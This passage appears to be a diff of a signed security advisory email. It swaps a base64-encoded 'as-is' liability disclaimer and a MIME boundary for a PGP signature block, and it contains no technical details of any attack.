-YXRpb24gY29udGFpbmVkIHdpdGhpbiB0aGlzIGFkdmlzb3J5IGlzIHN1cHBs
-aWVkICJhcy1pcyIgd2l0aApubyB3YXJyYW50aWVzIG9yIGd1YXJhbnRlZXMg
-b2YgZml0bmVzcyBvZiB1c2Ugb3Igb3RoZXJ3aXNlLiBJIGFjY2VwdCBubwpy
-ZXNwb25zaWJpbGl0eSBmb3IgYW55IGRhbWFnZSBjYXVzZWQgYnkgdGhlIHVz
-ZSBvciBtaXN1c2Ugb2YgdGhpcyBpbmZvcm1hdGlvbi4KCgoKCgo=
-
---001a114f5d7ce886610544e2521a--
+iQIcBAEBCAAGBQJXod95AAoJEHb/MwWLVhi2vJsP/3mNzGB1iKiPpJuwf/CV+WTk
+Y1wTcD45iQMF5BxDWKaLbZkTzqIhLw7elQFn0EW5Yybc/v9h11Ok3qSP3vm4m7AY
+WIN/2r3T2JWaFyjogmvRn2o5+N5ffaqMFNxL5xV4DclQHqitSdztic9Ud0Kthpqu
+9rT/91hFTWzS7jzlwmMrurrTWQ4fDD7H8/c4QXGNu4E3iaYLEJuz6OUbyAn5N2/j
+B4dKCnDrkd+4nEneBFGS5FWak90g7BZQ7No9XugmsufiO26CzCv4SYDT2P+HGSul
+UDxUIJLxM2Uo7vL25UMiSTRT04jzpggdL/95QFUVzjvYZ/5Srpv/lYCoKV6+CpOF
+FIFGoeqMegIMKUcm7oGwRLpiJRZ7e2OUyZ3vVkCtohgmWHHq5UZ025FopRQZiYTi
+MlCjJm61RGZGQRefVuC56UH2GgQ7VWEtT7T4Lbqtyu9Oyuy7GM/YrDhgu8GFp16K
+L51V/3ohw3HrYtMlVIBP4orrhm7LLOZOG5jSO3yy88TgHGByqjlnhcMtvsWHsP1y
+NSG+xZGr85tx71Bpp8rvEKbsZKY0q7bJ/05kF1CrPeeJfex2nUX0TocUFKkZsqwh
+NKVXeOkjMv4TLpZ2z6dH5CX0NNVPZodBJJ5sJQW9Mk0lPnIOLS+Argm9OI7CKFbY
+h/Vh2BSu7slwycmNpQjZ
+=ZFaZ
+-----END PGP SIGNATURE-----
